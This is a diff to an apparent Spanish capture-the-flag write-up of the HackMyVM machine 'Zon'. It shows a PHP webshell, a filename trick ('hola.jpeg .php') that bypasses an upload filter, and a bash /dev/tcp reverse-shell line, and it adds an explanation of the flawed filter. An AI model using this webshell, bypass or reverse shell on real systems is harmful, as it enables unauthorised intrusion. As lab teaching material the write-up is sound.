@@ -3,7 +3,7 @@ layout: post
 title: HackMyWM - Zon
 author: c4rta
 date: 2024-01-24
-tags: [HackMyWM, File Upload, Command Injection]
+tags: [HackMyWM, Arbitrary File Upload]
 image: /assets/img/zon/waifu.jpg
 ---
 
@@ -41,7 +41,7 @@ gobuster dir -u 192.168.1.74 -w /usr/share/seclists/Discovery/Web-Content/raft-m
 /choose.php           (Status: 200) [Size: 1908]
 ```
 
-## Explotacion (Command injection via filename)
+## Explotacion (Arbitrary File Upload)
 
 Viendo el funcionamiento de **choose.php**, vemos que podemos subir archivos .zip con archivos .jpeg dentro, y una vez subidos, se encuentran en el recurso **/uploads**. Si intentamos subir un archivo que no es jpeg, nos muestra algo como esto
 
@@ -49,7 +49,7 @@ Viendo el funcionamiento de **choose.php**, vemos que podemos subir archivos .zi
 
 En este punto podriamos probar tratar de hacer bypass de algunos filtros o hacer zip symlik pero no sera necesario, despues de una busqueda, encontre una forma de hacer **command injection** a travez del nombre del archivo que se sube a un sitio web, como se explica en este blog: [https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename](https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename)
 
-Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre **a$(whoami)z.jpeg**, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de **whoami**, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser del nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension **.jpeg**  para que lo aceptara. Asi que los pasos fueron:
+Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre **a$(whoami)z.jpeg**, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de **whoami**, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser el nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension **.jpeg**  para que lo aceptara. Asi que los pasos fueron:
 
 1. Crear un archivo php que sea una webshell, yo use: **<?php system($_GET['cmd']); ?>**
 
@@ -57,7 +57,7 @@ Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nomb
     ```ruby
     cp shell.php 'hola.jpeg .php'
     ```
-    Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba
+    Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba, y cuando se procese se elimine el espacio en blanco
 
     ![](/assets/img/zon/1.png)
 
@@ -74,6 +74,23 @@ Ahora nos podemos enviar una reverse shell usando bash:
 ```bash
 bash -i >& /dev/tcp/<ip>/443 0>&1 <-- Usar URL encode
 ```
+
+#### ¿Por que funciona?
+
+Si vemos el archivo **upload.php** encargado de la subida del archivo,  vemos la parte en la que hace el filtrado:
+
+```php
+$command = "unzip -l " . escapeshellarg($target_file) . " | awk '{print $4}' | grep -v \"\\.jpeg$\" | grep . | tail -n1 | grep \"\\.\"";
+        exec($command, $output, $return_var);
+```
+
+- Se usa **escapeshellarg** para escapar los caracteres especiales del nombre del archivo
+- Despues se usa **awk '{print $4}'** para imprimir la cuarta columna, la cual es el nombre del archivo
+- Despues usando grep para filtrar y excluir los que tienen ".jpeg"
+- Despues usando otro grep filtra por los archivos que contengan almenos un **.**
+- Y para finalizar usa otro grep para filtrar los archivos que tienen un solo punto seguido, es decir, **.** y no **..**, por lo que si el archivo tiene esto **archivo.jpeg ..php**, no lo aceptaria, por tener dos puntos seguidos antes del php
+
+Basicamente funciona por que solo se esta filtrando que contenga la cadena **.jpeg** mas no por toda la extension del archivo, asi que solo es necesario agregar el espacio (que luego sera eliminado) y el **.jpeg** para hacer bypass de ese filtro, seguido de la extension **.php**, quedando el archivo despues de procesar como: **archivo.jpeg.php**
 
 ## www-data -> freddie
 
@@ -149,7 +166,7 @@ Y despues mandamos a llamar a la variable escribiendo **shell** y ya seremos roo
 
 ![](/assets/img/zon/5.png)
 
-Espero que esta parte la haya explicado en esta parte
+(Espero que me haya explicado bien en esta parte)
 
 Eso ha sido todo, gracias por leer ❤
 
